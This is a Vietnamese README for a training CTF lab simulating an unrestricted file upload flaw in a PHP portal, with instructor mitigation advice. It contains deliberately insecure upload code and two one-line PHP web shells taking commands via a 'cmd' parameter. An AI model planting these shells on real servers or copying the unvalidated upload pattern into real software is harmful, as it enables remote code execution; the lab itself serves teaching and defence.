
# 🛡️ ChronoSoft Internal Upload Portal (CTF Lab - File Upload)

**Môi trường thực hành mô phỏng lỗ hổng File Upload trong ứng dụng web.**  
Đây là một CTF Lab được thiết kế để giúp học viên hiểu rõ và khai thác các lỗi sai phổ biến trong chức năng upload tệp tin.

---

## 📄 Mô tả hệ thống

Trang HTML chính cho phép người dùng tải lên tệp tin nội bộ (giả lập tài liệu nhân sự) qua form đơn giản:

```html
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" required />
    <input type="submit" value="Upload Document" />
</form>
```

Mã PHP phía server thực hiện:

```php
$upload_dir = 'upload/';
$upload_file = $upload_dir . basename($_FILES['file']['name']);
move_uploaded_file($_FILES['file']['tmp_name'], $upload_file);
```

---

## ⚠️ Lỗ hổng bảo mật

Chức năng upload này có những điểm yếu nghiêm trọng:

- ❌ Không kiểm tra định dạng (extension) của file
- ❌ Không xác thực MIME type
- ❌ Không lọc tên file nguy hiểm (như `.php`, `.exe`)
- ❌ Không đổi tên file khi lưu (có thể bị ghi đè hoặc dự đoán)
- ❌ Thư mục lưu file có thể truy cập trực tiếp (`upload/`)

📌 Hậu quả: Kẻ tấn công có thể upload một **web shell** (ví dụ: `shell.php`) và truy cập qua trình duyệt để thực thi mã trên server.

---

## 🎯 Mục tiêu của học viên

1. Thử upload file `.php` chứa mã thực thi
2. Truy cập đường dẫn `/upload/[filename]` để kiểm tra thực thi
3. Nếu thành công, thử gửi các lệnh hệ thống (ví dụ: `id`, `ls`, v.v.)
4. Ghi lại kết quả và học cách phòng chống lỗi này

---

## 🚀 Hướng dẫn triển khai

```bash
docker-compose up --build
```

Sau khi chạy, truy cập trình duyệt tại:

🔗 http://localhost:8080

---

## 🧪 Gợi ý khai thác

| Hành động | Gợi ý |
|-----------|-------|
| Upload shell | Dùng file như `shell.php`, `cmd.php`, hoặc script đơn giản |
| Truy cập file | Truy cập `http://localhost:8080/upload/shell.php` |
| Gửi lệnh | Nếu file thực thi, thử truyền lệnh qua GET: `?cmd=id` |

---

## 📦 Một số mã shell cơ bản

```php
<?php system($_GET['cmd']); ?>
```

```php
<?php echo shell_exec($_REQUEST["cmd"]); ?>
```

---

## 📌 Hướng dẫn phòng chống (dành cho giảng viên)

- Chỉ cho phép một số định dạng tệp tin cụ thể (PDF, PNG, DOCX)
- Kiểm tra MIME type, magic bytes
- Đổi tên file khi lưu (sử dụng UUID, hash + timestamp)
- Không cho phép truy cập trực tiếp thư mục lưu trữ
- Cấm thực thi file trong thư mục upload (qua cấu hình `.htaccess` hoặc web server)

---

## 📬 Liên hệ (giả lập)

📧 `security@chronosoft.io`

---

## ⚠️ Cảnh báo

> Đây là môi trường chứa lỗ hổng có chủ đích.  
> Tuyệt đối không triển khai trên môi trường thật.  
> Chỉ sử dụng cho mục đích giáo dục và thử nghiệm trong phạm vi kiểm soát.`
